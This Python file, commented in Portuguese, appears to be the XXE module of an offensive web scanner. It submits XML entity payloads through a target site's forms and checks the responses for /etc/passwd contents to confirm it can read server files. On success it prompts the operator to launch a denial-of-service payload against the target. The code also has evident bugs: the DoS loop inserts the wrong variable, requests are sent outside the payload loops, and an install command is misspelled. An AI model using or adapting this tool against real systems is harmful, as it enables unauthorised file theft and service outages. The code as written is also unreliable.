# !/usr/bin python3
from datetime import datetime
try:
    
   
    import os
    import time as current_time
    import logging
    import requests
   
    from core.banner import LINE
    from core.config import INITIAL_FORM_COUNT_VALUE
    from core.config import INITIAL_COUNT_VALUE
    from core import config as config
    from core import colors as color
    from core.config import HEADERS
    from core.config import DEFAULT_TIMEOUT
    from core.config import PROXIES_
    
    from core.utils import urlExplode
    from core.utils import exitTheProgram
    from core.utils import avaregeTime
    from core.utils import exitTheProgram

   
    

    try:
        from bs4 import BeautifulSoup
    except ImportError as e:
        print(color.falta+"[", datetime.now() ,"] BeautifullSoup não está instalada...");
        print(color.info+"[", datetime.now() ,"] Instalando o módulo BeautifullSoup...")
        os.system("sudpo apt-get install python3-bs4 | pip install beautifulsoup4")
        print(color.info+"[", datetime.now() ,"] BeautifullSoup instalado")
        quit()
        
    def _xxe(target_url, proxy, timeout, verbose, headers, data):
                
        print("["+color.green+"!"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]"+color.end+" Modo de"+color.orange+" deteção Xpath xml entity"+ color.end+" passada para o alvo "+color.orange+target_url+color.end)
        try:
            '''
            testando os parâmentros (Tal como um constructor)
            '''
            if not headers:
                headers = HEADERS
            else:
                pass
            if not timeout:
                timeout = DEFAULT_TIMEOUT
            else:
                pass
            if not proxy:
                proxy = PROXIES_
            else:
                pass
            
            if not data:
                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Testando a estabilidade da conexão, pode levar alguns minutos...")
                if(avaregeTime(target_url) >= INITIAL_FORM_COUNT_VALUE):
                    print(color.orange+"[!]["+color.admin_side, datetime.now(), "] Aviso: A sua conexão parece estar instável, recomenda-se que se tenha uma conexão estável."+color.end, end='')
                    ## ainda mostro o jitter aqui só pra comparar com o tempo de teste de injeções sql
                    user_option = str(input(" Deseja continuar? (sim/nao): "))
                    if user_option.lower() == 'sim':
                        pass
                    elif user_option.lower() == 'nao':
                        print(color.end+"[!][", datetime.now() ,"] Aviso: Terminando o teste..."+color.end, end='')
                        exitTheProgram()
                    else:
                        print(color.red+"[!][", datetime.now() ,"]  Erro: Entrada inválida, "+ color.end)
                        exitTheProgram()
                else:
                    print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Conexão estável ")
                    pass 
                
                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Identificando campos pra inserção de dados...") 
                initial_request = requests.get(url=target_url, timeout=timeout, headers=headers)
                initial_request_parsed = BeautifulSoup(initial_request.content, 'html.parser')
                
                ## filrando os formulários...
                form_tag = initial_request_parsed.find_all('form')
                form_quant = -1
                validation_page = {} 
                array_form = {}
                input_dic  = {}
                succed_payloads = []
                
                url_exploded = urlExplode(target_url)
                    ## percorre o objecto Soup do formulário, guardando ele no array_form com índices inteiros
                for form_perc in form_tag:
                    form_quant += 1
                    if 'action' in form_perc.attrs:
                        validation_page[form_quant] = form_perc['action']      
                    array_form[form_quant] = form_perc 
                print("["+color.green+"+"+color.end+"]"+color.end+"["+color.admin_side, datetime.now(), color.end+"] Foi encontrado [0 - (%s)] formulários." % (form_quant - 1 ), end='')
            
                if form_quant == INITIAL_COUNT_VALUE:
                        form_quant = 1  
                        user_option = 0
                else:
                    try:
                        user_option = int(input(" Qual a posição do formulário que desejas testar?: "))
                    except ValueError as e:
                        print(color.red+"[!][", datetime.now() ,"] Erro:  Valor inválido"+color.end)
                        exitTheProgram()
                    if user_option > form_quant or user_option < 0:
                        print(color.red+"[!][", datetime.now() ,"] Erro: Quantidade inválida."+color.end)
                        exitTheProgram()
                    else:
                        pass
                for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
                    ## monta a url de validação dos dados
                    try:
                        post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                    except KeyError:
                        print(color.red+"[!][", datetime.now() ,"] Erro: Quantidade inválida.")
                        exitTheProgram()
                    ## avança na execução conforme instruido pelo o usuário
                    print("["+color.green+"+"+color.end+"]" +color.end+"["+color.admin_side, datetime.now(), color.end+"] Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                    input_tag = array_form[user_option].find_all({'input'})
                    try:
                        with open('./mode/payload/xxe/include_file.txt', 'r')  as payloads:
                            for lines in payloads:
                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Enumerando"+color.cian, lines, color.end)
                                for input_tag_perc in input_tag:
                                    if 'type' in input_tag_perc.attrs:
                                        if 'checkbox' in input_tag_perc.attrs['type']:
                                            pass
                                        elif 'name' in input_tag_perc.attrs:
                                            input_dic[input_tag_perc.attrs['name']] = lines
                            main_requesition = requests.post(url=post_target_url, data=input_dic)
                            if "export PATH" in main_requesition.text.lower():
                                ## caso seja verdadeiro, dando outrass opções
                                print("["+color.green+"+"+color.end+"]" +color.end+"["+color.admin_side, datetime.now(), color.end+"] Alvo vulnerável a falha xxr,"+color.end+ " no formulário na posição "+color.cian,user_option,color.end, end='')
                                try:
                                    user_choise_atack = str(input(" dejesa lançar o ataque de negação de serviço contra o alvo?(sim/nao):"))
                                    if user_choise_atack.lower() == "sim":
#===================================================================== Lançado ataque de negação de serviço
                                        print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Enviando payloads de "+color.cian+"negação de serviço"+color.end)       
                                        with open('./mode/payload/xxe/dos.txt', 'r') as dos_payloads:
                                            for dos_lines in dos_payloads:
                                                for input_tag_perc in input_tag:
                                                    if 'type' in input_tag_perc.attrs:
                                                        if 'checkbox' in input_tag_perc.attrs['type']:
                                                            pass
                                                        elif 'name' in input_tag_perc.attrs:
                                                            input_dic[input_tag_perc.attrs['name']] = lines
                                        main_requesition = requests.post(url=post_target_url, data=input_dic)
                                        ## ler o código de retorno http para ataque de negação de serviço
                                    pass
                                except ValueError as e:
                                    print(color.red+"[!][", datetime.now() ,"] Erro: Valor inválida."+color.end)
                                    exitTheProgram()
                                break
                            else:
                                print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"]"+ color.cian, lines+color.end, end='')
                                pass
#=====================================================================       
                        with open('./mode/payload/xxe/get_etc.txt', 'r') as etc_passwd_payload:
                            for etc_passwd_lines in etc_passwd_payload:
                                    print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Enumerando"+color.cian, etc_passwd_lines, color.end)
                                    for input_tag_perc in input_tag:
                                        if 'type' in input_tag_perc.attrs:
                                            if 'checkbox' in input_tag_perc.attrs['type']:
                                                pass
                                            elif 'name' in input_tag_perc.attrs:
                                                input_dic[input_tag_perc.attrs['name']] = lines
                                    main_requesition = requests.post(url=post_target_url, data=input_dic)
                                    if "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" in main_requesition.text.lower():
                                        print("["+color.green+"+"+color.end+"]" +color.end+"["+color.admin_side, datetime.now(), color.end+"] Alvo vulnerável a falha xxr,"+color.end+ " no formulário na posição "+color.cian,user_option,color.end, end='')
                                        try:
                                            user_choise_atack = str(input(" dejesa lançar o ataque de negação de serviço contra o alvo?(sim/nao):"))
                                            if user_choise_atack.lower() == "sim":
#===================================================================== Lançado ataque de negação de serviço
                                                print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Enviando payloads de "+color.cian+"negação de serviço"+color.end)       
                                                with open('./mode/payload/xxe/dos.txt', 'r') as dos_payloads:
                                                    for dos_lines in dos_payloads:
                                                        for input_tag_perc in input_tag:
                                                            if 'type' in input_tag_perc.attrs:
                                                                if 'checkbox' in input_tag_perc.attrs['type']:
                                                                    pass
                                                                elif 'name' in input_tag_perc.attrs:
                                                                    input_dic[input_tag_perc.attrs['name']] = lines
                                                main_requesition = requests.post(url=post_target_url, data=input_dic)
                                                ## ler o código de retorno http para ataque de negação de serviço
                                            pass
                                        except ValueError as e:
                                            print(color.red+"[!][", datetime.now() ,"] Erro: Valor inválida."+color.end)
                                            exitTheProgram()
                                        break
                                    else:
                                        print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"]"+ color.cian, etc_passwd_lines+color.end, end='')  
                                        pass
                        print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"][Info] O Web spider não encontrou nenhum ponto vulnerável no alvo, o alvo deve estar sendo protegido por WAF, ou outros mecanismos de Segurança.")
                        exitTheProgram()
#=====================================================================
                    except FileNotFoundError as e:
                        print(color.red+"[!][", datetime.now() ,"] Erro:  Arquivo xxe-payload não encontrado"+color.end)
                        exitTheProgram()
            else:
                '''
                Executa o modo de ação usando os payloads nativos do programa
                '''
                return 
        except requests.exceptions.RequestException as e:
            print(color.red+"[!][", datetime.now() ,"] Erro: alvo Inacessível, verifique a sua ligação à internet ou contacte o Web master."+color.end)
            exitTheProgram()
except KeyboardInterrupt as e:
     print(color.red+"[!][", datetime.now() ,"] Erro: Interrupção pela parte do usuário "+color.end)
     exitTheProgram()
    